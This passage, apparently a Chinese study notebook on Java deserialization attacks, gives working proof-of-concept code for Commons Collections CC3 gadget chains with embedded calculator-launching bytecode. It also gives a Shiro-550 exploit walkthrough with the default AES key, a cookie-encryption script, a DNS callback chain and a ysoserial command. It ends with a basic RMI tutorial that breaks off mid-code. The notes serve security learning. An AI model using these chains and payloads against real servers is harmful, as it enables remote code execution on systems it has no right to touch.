    byte[] code = Base64.getDecoder().decode("yv66vgAAADQAJgoACAAVCQAWABcIABgKABkAGggAGwgAHAcAHQcAHgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAfAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEACVRlc3QuamF2YQwAEAARBwAgDAAhACIBABjosIPnlKjkuobmma7pgJrku6PnoIHlnZcHACMMACQAJQEAFeiwg+eUqOaXoOWPguaehOmAoOWZqAEAGOiwg+eUqOS6humdmeaAgeS7o+eggeWdlwEABFRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABwAIAAAAAAAEAAEACQAKAAIACwAAABkAAAADAAAAAbEAAAABAAwAAAAGAAEAAAALAA0AAAAEAAEADgABAAkADwACAAsAAAAZAAAABAAAAAGxAAAAAQAMAAAABgABAAAAEAANAAAABAABAA4AAQAQABEAAQALAAAAOQACAAEAAAAVKrcAAbIAAhIDtgAEsgACEgW2AASxAAAAAQAMAAAAEgAEAAAAGgAEABcADAAbABQAHAAIABIAEQABAAsAAAAlAAIAAAAAAAmyAAISBrYABLEAAAABAAwAAAAKAAIAAAATAAgAFAABABMAAAACABQ=");
    TemplatesImpl templates = new TemplatesImpl();
    setFieldValue(templates,"_name","xxx");
    setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
    setFieldValue(templates,"_bytecodes",new byte[][]{code});

    Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(templates),
            new InvokerTransformer("newTransformer",null,null)
    };

    Transformer transformerChain = new ChainedTransformer(transformers);

    Map innerMap = new HashMap();
    Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

    outerMap.put("test","123");
}
```

完整：

```java
@Test
public void test02() throws Exception {
    byte[] code = Base64.getDecoder().decode("yv66vgAAADQAJgoACAAVCQAWABcIABgKABkAGggAGwgAHAcAHQcAHgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAfAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEACVRlc3QuamF2YQwAEAARBwAgDAAhACIBABjosIPnlKjkuobmma7pgJrku6PnoIHlnZcHACMMACQAJQEAFeiwg+eUqOaXoOWPguaehOmAoOWZqAEAGOiwg+eUqOS6humdmeaAgeS7o+eggeWdlwEABFRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABwAIAAAAAAAEAAEACQAKAAIACwAAABkAAAADAAAAAbEAAAABAAwAAAAGAAEAAAALAA0AAAAEAAEADgABAAkADwACAAsAAAAZAAAABAAAAAGxAAAAAQAMAAAABgABAAAAEAANAAAABAABAA4AAQAQABEAAQALAAAAOQACAAEAAAAVKrcAAbIAAhIDtgAEsgACEgW2AASxAAAAAQAMAAAAEgAEAAAAGgAEABcADAAbABQAHAAIABIAEQABAAsAAAAlAAIAAAAAAAmyAAISBrYABLEAAAABAAwAAAAKAAIAAAATAAgAFAABABMAAAACABQ=");
    TemplatesImpl templates = new TemplatesImpl();
    setFieldValue(templates,"_name","xxx");
    setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
    setFieldValue(templates,"_bytecodes",new byte[][]{code});

    Transformer[] transformers =new Transformer[]{
            new ConstantTransformer(templates),
            new InvokerTransformer("newTransformer",null,null)
    };
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

    HashMap<Object, Object> map = new HashMap<Object, Object>();
    map.put("value", "s"); //设置map的key == Target 注解中的value()方法名
    Map<Object, Object> TransformedMapMethod =
            TransformedMap.decorate(map, null, chainedTransformer);
    Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor<?> annotationInvocationConstructor =
            c.getDeclaredConstructor(Class.class, Map.class);
    annotationInvocationConstructor.setAccessible(true);
    Object o = annotationInvocationConstructor.newInstance(Target.class, TransformedMapMethod);
    serialize(o);
    unserialize();
}
```

### Ysoserial CC3链

据p神在《JAVA安全漫谈》中的描述，在Ysoserial的作者发布第一版的ysoserial后，开发者们开始寻求⼀种安全的过滤⽅法，于是SerialKiller—⼀个Java反序列化过滤器就诞⽣。它通过⿊名单与⽩名单的⽅式来限制反序列化时允许通过的类。在其发布的第⼀个版本代码中，**最初的⿊名单中就有InvokerTransformer**

#### 1.TrAXFilter

我们就按照以前的思路通过find usages来找谁调用了TemplatesImpl#newTransformer()：

<img src=".\图片\64022" alt="图片" style="zoom:80%;" />

我们选择看着就觉得比较简单的com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter这个类。在它的构造器中调用了(TransformerImpl) templates.newTransformer()。

#### 2.InstantiateTransformer

由于是构造方法，若我们再按照之前的思路去找谁调用了TrAXFilter的构造器时，发现最终找到的还是构造方法。此处需要转变下思路，在一系列实现了org.apache.commons.collections.Transformer接口的类中，除了InvokerTransformer还有没有哪个可以调用到任意类的构造方法呢？

最终找到org.apache.commons.collections.functors.InstantiateTransformer：

<img src=".\图片\640aa" alt="图片" style="zoom: 80%;" />

显然，这个类就是为调用任意类的public构造方法而生的，它的transform()方法通过反射调用任意类的public构造器。妙哉！！！

#### 3.POC编写

显然，Gadget链很清晰了，我们只需要将上面的CC3_demo中的Transformer数组改成：

<img src=".\图片\640aq" alt="图片" style="zoom:80%;" />

字节码改成弹计算器，后面改成LazyMap CC1链的后半部分，即为CC3链的POC。

完整POC如下：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javafx.fxml.FXML;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import java.io.*;
import java.lang.reflect.*;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC3_lazymap {
   public static void setFieldValue(Object obj, String field, Object value) throws NoSuchFieldException, IllegalAccessException {
       Class<?> clazz = obj.getClass();
       Field fieldName = clazz.getDeclaredField(field);
       fieldName.setAccessible(true);
       fieldName.set(obj, value);
  }

   public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, TransformerConfigurationException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IOException {
       byte[] code = Base64.getDecoder().decode("yv66vgAAADQAKQoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHACIBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAGPGluaXQ+AQADKClWAQANU3RhY2tNYXBUYWJsZQcAIAcAHQEAClNvdXJjZUZpbGUBAApDYWxjMS5qYXZhDAARABIHACMMACQAJQEABGNhbGMMACYAJwEAE2phdmEvbGFuZy9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwAEQAoAQAFQ2FsYzEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAAAwABAAoACwACAAwAAAAZAAAAAwAAAAGxAAAAAQANAAAABgABAAAACAAOAAAABAABAA8AAQAKABAAAgAMAAAAGQAAAAQAAAABsQAAAAEADQAAAAYAAQAAAAoADgAAAAQAAQAPAAEAEQASAAEADAAAAGUAAwACAAAAGyq3AAG4AAISA7YABFenAA1MuwAGWSu3AAe/sQABAAQADQAQAAUAAgANAAAAGgAGAAAADAAEAA4ADQARABAADwARABAAGgASABMAAAAQAAL/ABAAAQcAFAABBwAVCQABABYAAAACABc=");
       TemplatesImpl templates = new TemplatesImpl();
       setFieldValue(templates, "_name", "xxx");
       setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
       setFieldValue(templates, "_bytecodes", new byte[][]{code});

       Transformer[] transformers = new Transformer[]{
               new ConstantTransformer(TrAXFilter.class),
               new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
      };

       ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
       Map map = new HashMap();

       Map lazyMap = LazyMap.decorate(map, chainedTransformer);


       Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
       Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
       constructor.setAccessible(true);
       InvocationHandler handler = (InvocationHandler) constructor.newInstance(FXML.class, lazyMap);

       Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);

       handler = (InvocationHandler) constructor.newInstance(FXML.class, proxyMap);

       ByteArrayOutputStream bos = new ByteArrayOutputStream();
       ObjectOutputStream oos = new ObjectOutputStream(bos);
       oos.writeObject(handler);
       oos.close();

       ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray()));
       ois.readObject();
  }
}
```

运行后弹出计算器

<img src=".\图片\Snipaste_2023-03-06_15-18-19.png" alt="Snipaste_2023-03-06_15-18-19" style="zoom:50%;" />

### CC3改简化版CC6 

显然，CC3链同CC1链一样，都会有JDK<=8u71的限制。那么我们可以结合前面学的CC6链（实际上是简化版CC6）将其改造成一个**通杀的链子**。

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC3_CC6 {
   public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, TransformerConfigurationException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IOException {
       byte[] code = Base64.getDecoder().decode("yv66vgAAADQAKQoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHACIBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAGPGluaXQ+AQADKClWAQANU3RhY2tNYXBUYWJsZQcAIAcAHQEAClNvdXJjZUZpbGUBAApDYWxjMS5qYXZhDAARABIHACMMACQAJQEABGNhbGMMACYAJwEAE2phdmEvbGFuZy9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwAEQAoAQAFQ2FsYzEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAAAwABAAoACwACAAwAAAAZAAAAAwAAAAGxAAAAAQANAAAABgABAAAACAAOAAAABAABAA8AAQAKABAAAgAMAAAAGQAAAAQAAAABsQAAAAEADQAAAAYAAQAAAAoADgAAAAQAAQAPAAEAEQASAAEADAAAAGUAAwACAAAAGyq3AAG4AAISA7YABFenAA1MuwAGWSu3AAe/sQABAAQADQAQAAUAAgANAAAAGgAGAAAADAAEAA4ADQARABAADwARABAAGgASABMAAAAQAAL/ABAAAQcAFAABBwAVCQABABYAAAACABc=");
       TemplatesImpl templates = new TemplatesImpl();
       setFieldValue(templates, "_name", "xxx");
       setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
       setFieldValue(templates, "_bytecodes", new byte[][]{code});

       Transformer[] fakeformers = {new ConstantTransformer(1)};
       Transformer[] transformers = new Transformer[]{
               new ConstantTransformer(TrAXFilter.class),
               new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
      };

       //先传入人畜无害的fakeformers避免put时就弹计算器
       ChainedTransformer chainedTransformer = new ChainedTransformer(fakeformers);

       Map innerMap = new HashMap();
       Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);
       TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "xxx");

       HashMap hashMap = new HashMap();
       hashMap.put(tiedMapEntry, "test");
       lazyMap.remove("xxx");

       //反射修改chainedTransformer中的iTransformers为transforms
//       Class clazz = chainedTransformer.getClass();
//       Field field = clazz.getDeclaredField("iTransformers");
//       field.setAccessible(true);
//       field.set(chainedTransformer, transformers);
       setFieldValue(chainedTransformer,"iTransformers",transformers);

       ByteArrayOutputStream bos = new ByteArrayOutputStream();
       ObjectOutputStream oos = new ObjectOutputStream(bos);
       oos.writeObject(hashMap);
       oos.close();

       ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray()));
       ois.readObject();
  }

   public static void setFieldValue(Object obj, String field, Object value) throws NoSuchFieldException, IllegalAccessException {
       Class<?> clazz = obj.getClass();
       Field fieldName = clazz.getDeclaredField(field);
       fieldName.setAccessible(true);
       fieldName.set(obj, value);
  }
}
```

运行后依然弹出计算器

## 	其它

<img src=".\图片\Snipaste_2023-03-08_15-28-26.png" alt="Snipaste_2023-03-08_15-28-26" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-03-08_15-28-39.png" alt="Snipaste_2023-03-08_15-28-39" style="zoom:80%;" />

# Shiro

Apache Shiro 是⼀个功能强⼤且易于使⽤的 Java 安全框架，它⽤于处理身份验证，授权，加密和会话 管理

在默认情况下 , Apache Shiro 使⽤ CookieRememberMeManager 对⽤户身份进⾏序列化/反序列化 , 加 密/解密和编码/解码 , 以供以后检索

因此 , 当 Apache Shiro 接收到未经身份验证的⽤户请求时 , 会执⾏以下操作来寻找他们被记住的身份

**从请求数据包中提取 Cookie 中 rememberMe 字段的值，对提取的 Cookie 值进⾏ Base64 解码，对 Base64 解码后的值进⾏ AES 解密，对解密后的字节数组调⽤ ObjectInputStream.readObject() ⽅法来 反序列化**

但是默认AES加密密钥是 “硬编码” 在代码中的 . 因此 , 如果服务端采⽤默认加密密钥 , 那么攻击者就可以 构造⼀个恶意对象 , 并对其进⾏序列化 , AES加密 , Base64编码 , 将其作为 Cookie 中 rememberMe 字段 值发送 . Apache Shiro 在接收到请求时会反序列化恶意对象 , 从⽽执⾏攻击者指定的任意代码 

## Shiro550

原理

Shiro 550 反序列化漏洞存在版本：shiro <1.2.4，产⽣原因是因为shiro接受了Cookie⾥⾯rememberMe 的值，然后去进⾏Base64解密后，再使⽤aes密钥解密后的数据，进⾏反序列化

### 漏洞分析

shiro默认使⽤了CookieRememberMeManager，其处理cookie的流程是：

```
得到rememberMe的cookie值 --> Base64解码 --> AES解密 --> 反序列化
```

然⽽**AES的密钥是硬编码**的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞

payload 构造的顺序则就是相对的反着来：

```
恶意命令-->序列化-->AES加密-->base64编码-->发送cookie
```

### 漏洞发现

1、检索RememberMe cookie 的值

2、Base 64解码

3、使用AES解密(加密密钥硬编码)

4、进行反序列化操作（未作过滤处理）

shiro序列化利用条件：

由于使用了aes加密，要想成功利用漏洞则需要获取aes的加密密钥，而在shiro的1.2.4之前版本中使用的是硬编码。其默认密钥的base64编码后的值为 `kPH+bIxk5D2deZiIxcaaaA==` ，这里就可以通过构造恶意的序列化对象进行编码，加密，然后作为cookie加密发送，服务端接收后会解密并触发反序列化漏洞。

### 漏洞复现

#### 环境搭建

```bash
docker pull medicean/vulapps:s_shiro_1
systemctl restart docker
docker run -d -p 8081:8080 medicean/vulapps:s_shiro_1
```

#### 步骤-urldns

选择 `Remember me` 登录抓包查看数据包

<img src=".\图片\Snipaste_2023-03-09_14-48-07.png" alt="Snipaste_2023-03-09_14-48-07" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-03-09_14-52-13.png" alt="Snipaste_2023-03-09_14-52-13" style="zoom:80%;" />

手工构造 `URLDNS` 链生成 `ser_shiro.bin` 文件

```java
package org.example.shiroTest;
import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;
public class Urldns {
    public static void main(String[] args) throws Exception {
                /*
        利用链:
            ObjectInputStream#readObject() -> HashMap.readObject(ObjectInputStream in)
            HashMap -> hash()
            URL -> hashCode()
            URLStreamHandler -> hashCode()
            URLStreamHandler -> getHostAddress()
            URL -> getHostAddress()
            InetAddress -> getByName()
         */
        HashMap hashMap = new HashMap();
        URL url = new URL("http://h096ov.dnslog.cn");

        Field hashCodeField = url.getClass().getDeclaredField("hashCode");
        hashCodeField.setAccessible(true);

        // 阻止创建payload时触发请求
        hashCodeField.set(url, 0);
        hashMap.put(url, null);
        // 使利用链执行时能够触发请求
        hashCodeField.set(url, -1);

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(new File("ser_shiro.bin")));
        oos.writeObject(hashMap);
        oos.close();
    }
}
```

接着⽤脚本进⾏加密

```python
import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES
def get_file(name):
    with open(name,'rb') as f:

        data = f.read()

    return data

def en_aes(data):

    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))

    return base64_ciphertext

if __name__ == '__main__':

    data = get_file("ser_shiro.bin")
    print(en_aes(data))
```

<img src=".\图片\Snipaste_2023-03-09_15-07-13.png" alt="Snipaste_2023-03-09_15-07-13" style="zoom:80%;" />

再把序列化且加密后的结果 放在 Cookie 的 rememberMe 里，并且删掉 JSESSIONID 字段值

<img src=".\图片\Snipaste_2023-03-09_15-28-35.png" alt="Snipaste_2023-03-09_15-28-35" style="zoom: 80%;" />

发现接收到DNS请求

<img src=".\图片\Snipaste_2023-03-09_15-29-17.png" alt="Snipaste_2023-03-09_15-29-17" style="zoom:80%;" />

#### 步骤-CC链

使用 ysoserial 生成 CommonsBeanutils1 的Gadget：

```
java -jar ysoserial-master-30099844c6-1.jar CommonsBeanutils1 "touch /tmp/success" > poc.ser
```

再用脚本进⾏加密，接着把序列化且加密后的结果 放在 Cookie 的 rememberMe 里，并且删掉 JSESSIONID 字段值。步骤与之前URLDNS测试时步骤一样

使用一些工具也可以达成目的

<img src=".\图片\Snipaste_2023-03-09_15-38-59.png" alt="Snipaste_2023-03-09_15-38-59" style="zoom:80%;" />

## shiro721

CVE-2019-12422 漏洞详细

这两个漏洞主要区别在于Shiro550使⽤已知密钥碰撞，后者Shiro721**是使⽤ 登录 后rememberMe= {value}去爆破正确的key值** 进⽽反序列化，对⽐Shiro550条件只 要有 ⾜够密钥库 （条件⽐较低）、Shiro721需要登录（要求⽐较⾼鸡肋 ）。 Apache Shiro < 1.4.2 默认使⽤ AES/CBC/PKCS5Padding 模式

shiro721⽤到的加密⽅式是AES-CBC，⽽且其中的ase加密的key基本猜不到了，是系统随机⽣成的。⽽ cookie解析过程跟cookie的解析过程⼀样，也就意味着如果能伪造恶意的rememberMe字段的值且⽬标 含有可利⽤的攻击链的话，还是能够进⾏RCE的。

通过Padding Oracle Attack攻击可以实现破解AES-CBC加密过程进⽽实现rememberMe的内容伪造。 下⾯会有单独的篇幅讲Padding Oracle Attack。

影响版本：

```
1.2.5,
1.2.6,
1.3.0,
1.3.1,
1.3.2,
1.4.0-RC2,
1.4.0,
1.4.1
```

⼀次成功的Shiro Padding Oracle**需要⼀直向服务器不断发包**，判断服务器返回，**攻击时间通常需要⼏个⼩时**。由于此漏洞利⽤起来耗时时间特别⻓，很容易被waf封禁，因此在真实的红队项⽬中，极少有此漏 洞的攻击成功案例

详细：https://blog.csdn.net/qq_41874930/article/details/121314926 

# RMI

https://xz.aliyun.com/t/9261#toc-9   https://www.anquanke.com/post/id/263726  https://su18.org/post/rmi-attack/  

https://xz.aliyun.com/t/6660#toc-6

## 机制概念：

RMI 全称是 Remote Method Invocation，**远程方法调⽤**。从这个名字就可以看出，他的⽬标和 RPC 其实是类似的，是**让某个Java虚拟机上的对象调⽤另⼀个Java虚拟机中对象上的⽅法**，只不过RMI是Java独 有的⼀种机制

## RMI基本名词：

从RMI设计角度来讲，基本分为三层架构模式来实现RMI，分别为RMI服务端，RMI客户端和RMI注册中心。

**客户端:**

存根/桩(Stub):远程对象在客户端上的代理;
远程引用层(Remote Reference Layer):解析并执行远程引用协议;
传输层(Transport):发送调用、传递远程方法参数、接收远程方法执行结果。

**服务端:**

骨架(Skeleton):读取客户端传递的方法参数，调用服务器方的实际对象方法， 并接收方法执行后的返回值;
远程引用层(Remote Reference Layer):处理远程引用后向骨架发送远程方法调用;
传输层(Transport):监听客户端的入站连接，接收并转发调用到远程引用层。

**注册表(Registry):**以URL形式注册远程对象，并向客户端回复对远程对象的引用。

## 流程原理

<img src=".\图片\20210227013102-65c85794-7858-1.png" alt="20210227013102-65c85794-7858-1" style="zoom:80%;" />

## 案例入门

### 通用配置：

（即两个不同的工程都需要的配置，注意两个工程的包名得一样）

⼀个RMI Server分为三部分： 

1. ⼀个继承了 java.rmi.Remote 的接⼝，其中定义我们要远程调⽤的函数，⽐如这⾥的 hello() 
2. ⼀个实现了此接⼝的类 
3. ⼀个主类，⽤来创建Registry，并将上⾯的类实例化后绑定到⼀个地址。这就是我们所谓的Server了

定义一个远程接口：

这里我们定义了一个HelloInterface接口，定义了一个hello方法，同时抛出RemoteException异常。

```java
package com.zf1yolo;

import java.rmi.Remote;
import java.rmi.RemoteException;
// 定义一个远程接口，继承java.rmi.Remote接口
public interface HelloInterface extends Remote {
    String Hello(String age) throws RemoteException;
}
```

同时我们在使用RMI远程方法调用的时候，需要事先定义一个远程接口，继承java.rmi.Remote接口，但该接口仅为RMI标识接口，本身不代表使用任何方法，说明可以进行RMI java虚拟机调用。

同时由于RMI通信本质也是基于“网络传输”，所以也要抛出RemoteException异常。

### RMI服务器端

**远程接口实现类：**

```java
package com.zf1yolo;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

// 远程接口实现类，继承UnicastRemoteObject类和Hello接口

public class HelloImp extends UnicastRemoteObject implements HelloInterface {

    private static final long serialVersionUID = 1L;

    protected HelloImp() throws RemoteException {
        super(); // 调用父类的构造函数
    }

    @Override
    public String Hello(String age) throws RemoteException {
        return "Hello" + age; // 改写Hello方法
    }
}
```

接着我们创建HelloImp类，继承UnicastRemoteObject类和Hello接口，定义改写HelloInterface接口的hello方法。

但远程接口实现类必须继承UnicastRemoteObject类，用于生成 Stub（存根）和 Skeleton（骨架）。

- Stub可以看作远程对象在本地的一个代理，囊括了远程对象的具体信息，客户端可以通过这个代理和服务端进行交互。
- Skeleton可以看作为服务端的一个代理，用来处理Stub发送过来的请求，然后去调用客户端需要的请求方法，最终将方法执行结果返回给Stub。

同时跟进UnicastRemoteObject 类源代码我们可以发现，其构造函数抛出了RemoteException异常。但这种写法是十分不好的，所以我们通过super()关键词调用父类的构造函数。

<img src=".\图片\Snipaste_2023-03-09_18-39-51.png" alt="Snipaste_2023-03-09_18-39-51" style="zoom:80%;" />

**RMIServer主类：**

```java
package com.zf1yolo;

import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;
// 服务端
public class RMIServer {
    public static void main(String[] args) {
        try {
            HelloInterface h  = new HelloImp(); // 创建远程对象HelloImp对象实例

            //创建并运行RMI Registry
            LocateRegistry.createRegistry(1099); // 获取RMI服务注册器
            //将RemoteHelloWorld对象绑定到Hello这个名字上
            Naming.rebind("rmi://localhost:1099/hello",h); // 绑定远程对象HelloImp到RMI服务注册器
            
            System.out.println("RMIServer start successful");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

这里客户端可以通过这个URL直接访问远程对象，不需要知道远程实例对象的名称，这里服务端配置完成。RMIServer将提供的服务注册在了 RMIService上,并且公开了一个固定的路径 ,供客户端访问。

### RMI客户端配置

客户端只需要调用 java.rmi.Naming.lookup 函数，通过公开的路径从RMIService服务器上拿到对应接口的实现类， 之后通过本地接口即可调用远程对象的方法

```java
package com.zf1yolo;
import java.net.MalformedURLException;
import java.rmi.Naming;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
// 客户端
public class RMIClient {
    public static void main(String[] args){
        try {
            HelloInterface h = (HelloInterface) Naming.lookup("rmi://localhost:1099/hello"); // 寻找RMI实例远程对象
            System.out.println(h.Hello("run......"));
        }catch (MalformedURLException e) {
            System.out.println("url格式异常");
        } catch (RemoteException e) {
